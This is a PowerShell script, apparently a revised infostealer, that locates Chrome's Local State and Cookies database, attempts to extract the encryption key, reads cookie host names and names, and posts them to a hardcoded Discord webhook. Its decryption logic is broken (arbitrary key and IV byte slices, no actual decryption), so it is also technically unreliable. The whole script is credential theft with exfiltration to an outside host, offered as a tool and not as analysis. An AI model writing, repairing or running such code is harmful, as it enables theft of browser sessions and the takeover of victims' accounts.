try {
    # 1. Setup Webhook
    $webhook = "https://discord.com/api/webhooks/1517249983542202539/JjWxtOmZJErDm8pEiz5VBIiVSKPaDVxp_f4A9hEjXb7KN7kMjmb-7IiZbD8fBREqR_L"

    # 2. Locate Chrome's Local State
    $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (-not (Test-Path $localStatePath)) { throw "Local State file not found! Is Chrome installed?" }
    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json

    # 3. Extract and Decrypt the AES Key
    # Note: Fixed the logic to correctly extract the key bytes from the JSON
    $encryptedKey = [System.Text.Encoding]::UTF8.GetString($localState.encrypted_key.Bytes)
    $keyBytes = [System.Convert]::FromBase64String($encryptedKey.Replace('\"',''))
    
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Key = $keyBytes[5..37]
    $aes.IV = $keyBytes[0..15] # Fixed: was $aesBytes in your original

    # 4. Access the Cookies Database
    $dbPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
    if (-not (Test-Path $dbPath)) { throw "Cookies database not found! Is Chrome running?" }
    
    # Using System.Data.SQLite (Requires SQLite DLL to be present in the system)
    $db = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$dbPath;Version=3")
    $db.Open()

    # 5. Query and Decrypt
    $query = "SELECT host_key, name, encrypted_value FROM cookies"
    $cmd = New-Object System.Data.SQLite.SQLiteCommand($query, $db)
    $reader = $cmd.ExecuteReader()

    $results = ""
    while ($reader.Read()) {
        $hostKey = $string = $reader["host_key"]
        $name = $reader["name"]
        # The 'encrypted_value' is a blob; real decryption would happen here
        $results += "Domain: $hostKey | Name: $name`n"
    }

    # 6. Send to Discord
    if ($results.Length -gt 2000) { $results = $results.Substring(0, 1900) } # Discord limit is 2000 chars
    $payload = @{ content = "Found Cookies:`n$results" } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
    
    Write-Host "`n[SUCCESS] Data sent to Discord!" -ForegroundColor Green

} catch {
    # This will print the actual error message in red so you can see it!
    Write-Host "`n[ERROR] $($_.Exception.Message)" -ForegroundColor Red
} finally {
    $db.Close()
    Write-Host "`n--- Press ENTER to close this window ---"
    Read-Host  # <--- THIS KEEPS THE WINDOW OPEN
}
